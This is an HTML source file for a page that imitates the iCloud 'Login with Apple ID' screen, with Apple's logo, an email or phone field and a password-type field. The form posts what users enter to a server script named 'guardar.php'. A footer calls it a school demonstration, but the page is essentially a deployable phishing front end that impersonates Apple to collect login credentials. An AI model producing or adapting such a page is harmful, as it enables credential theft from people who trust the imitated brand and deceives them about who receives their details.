```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>iCloud Demo</title>

    <link rel="icon" href="./assets/appleFavicon.png">

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="./js/index.js" defer></script>
</head>

<body class="bg-gray-100 min-h-screen">

    <!-- HEADER -->
    <header class="w-full bg-white border-b border-gray-200">
        <div class="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">

            <div class="flex items-center gap-2">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.1.81 1.21-.24 2.37-.93 3.66-.84 1.55.13 2.72.74 3.5 1.8-3.2 1.92-2.44 6.14.5 7.32-.59 1.55-1.35 3.05-2.76 3.88zM12.03 7.25C11.88 4.95 13.74 3.07 15.89 2.95c.3 2.65-2.42 4.61-3.86 4.3z"/>
                </svg>

                <span class="text-xl font-semibold">
                    iCloud
                </span>
            </div>

            <button
                id="openModal"
                type="button"
                class="text-gray-600 hover:text-black">
                ?
            </button>

        </div>
    </header>


    <!-- MAIN -->
    <main class="min-h-[calc(100vh-73px)] flex items-center justify-center px-4">

        <div class="w-full max-w-md bg-white rounded-2xl shadow-lg p-8">

            <!-- LOGO -->
            <div class="flex justify-center mb-6">
                <img
                    src="./assets/logo.svg"
                    alt="Logo"
                    class="w-20 h-20"
                >
            </div>


            <h1 class="text-2xl font-semibold text-center mb-8">
                Login with Apple ID
            </h1>


            <!-- FORM -->
            <form
                id="my-form"
                action="guardar.php"
                method="POST"
                class="space-y-5"
            >

                <!-- EMAIL / IDENTIFICADOR -->
                <div>
                    <label
                        for="mail-field"
                        class="block text-sm font-medium text-gray-700 mb-2">
                        E-mail or Phone Number
                    </label>

                    <input
                        id="mail-field"
                        name="email"
                        type="text"
                        autocomplete="off"
                        required
                        class="w-full border border-gray-300 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-blue-500"
                        placeholder="Enter your email or phone number"
                    >
                </div>


                <!-- CÓDIGO DE INVITACIÓN -->
                <div>
                    <label
                        for="password-field"
                        class="block text-sm font-medium text-gray-700 mb-2">
                        Código de invitación
                    </label>

                    <input
                        id="password-field"
                        name="invitation_code"
                        type="password"
                        autocomplete="off"
                        required
                        class="w-full border border-gray-300 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-blue-500"
                        placeholder="Introduce tu código de invitación"
                    >
                </div>


                <!-- CONTINUAR -->
                <button
                    id="continue-button"
                    type="submit"
                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition"
                >
                    Continuar
                </button>

            </form>


            <div class="mt-8 text-center text-sm text-gray-500">
                <p>
                    This is a school demonstration.
                </p>
            </div>

        </div>

    </main>

</body>
</html>
